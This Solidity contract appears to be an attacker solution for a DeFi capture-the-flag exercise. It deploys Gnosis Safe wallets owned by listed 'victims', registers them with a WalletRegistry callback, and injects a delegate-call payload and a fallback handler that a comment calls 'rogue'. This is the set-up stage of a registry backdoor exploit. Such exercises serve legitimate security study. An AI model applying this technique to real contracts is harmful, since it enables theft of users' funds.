pragma solidity 0.8.12;

import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {WalletRegistry} from "./WalletRegistry.sol";

// Your contract
contract WalletCreator {
    // Address of the Gnosis Safe master copy contract
    address immutable gnosisSafeMasterCopy;

    // Address of the Gnosis Safe proxy factory contract
    address immutable gnosisSafeProxyFactory;

    address immutable fallbackHandler;

    address immutable paymentToken;

    WalletRegistry immutable walletRegistry;

    address[4] private _victims;

    uint256 private constant MAX_THRESHOLD = 1;

    constructor(
        address gnosisSafeMasterCopy_,
        address gnosisSafeProxyFactory_,
        WalletRegistry walletRegistry_,
        address[4] memory victims_,
        address fallbackHandler_,
        address paymentToken_
    ) {
        gnosisSafeMasterCopy = gnosisSafeMasterCopy_;
        gnosisSafeProxyFactory = gnosisSafeProxyFactory_;
        walletRegistry = walletRegistry_;
        _victims = victims_;
        fallbackHandler = fallbackHandler_;
        paymentToken = paymentToken_;
    }

    // Safes created via the official interfaces use the DefaultCallbackHandler as their fallback handler.
    // A fallback handler can be replaced or extended anytime via a regular Safe transaction
    // (respecting threshold and owners of the Safe).
    function createGnosisSafeWallet(
        address to,
        bytes memory data,
        uint256 payment,
        address payable paymentReceiver
    ) public {
        // Encode the data for the GnosisSafe "setup" function call
        /// @dev Setup function sets initial storage of contract.
        /// @param _owners List of Safe owners.
        /// @param _threshold Number of required confirmations for a Safe transaction.
        /// @param to Contract address for optional delegate call.
        /// @param data Data payload for optional delegate call.
        /// @param fallbackHandler Handler for fallback calls to this contract
        /// @param paymentToken Token that should be used for the payment (0 is ETH)
        /// @param payment Value that should be paid
        /// @param paymentReceiver Address that should receive the payment (or 0 if tx.origin)
        bytes memory initializer = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            _victims,
            MAX_THRESHOLD,
            to,
            data,
            // We need a fallback that's rogue
            fallbackHandler,
            paymentToken,
            payment,
            paymentReceiver
        );

        // Create a unique nonce for the proxy contract
        uint256 saltNonce = uint256(
            keccak256(abi.encodePacked(block.timestamp, msg.sender))
        );

        // Call the createProxyWithCallback function to create the proxy contract
        GnosisSafeProxy proxy = GnosisSafeProxyFactory(gnosisSafeProxyFactory)
            .createProxyWithCallback(
                address(gnosisSafeMasterCopy), // The singleton contract
                initializer, // The initializer data
                saltNonce, // The nonce
                walletRegistry // The callback contract
            );
    }
}
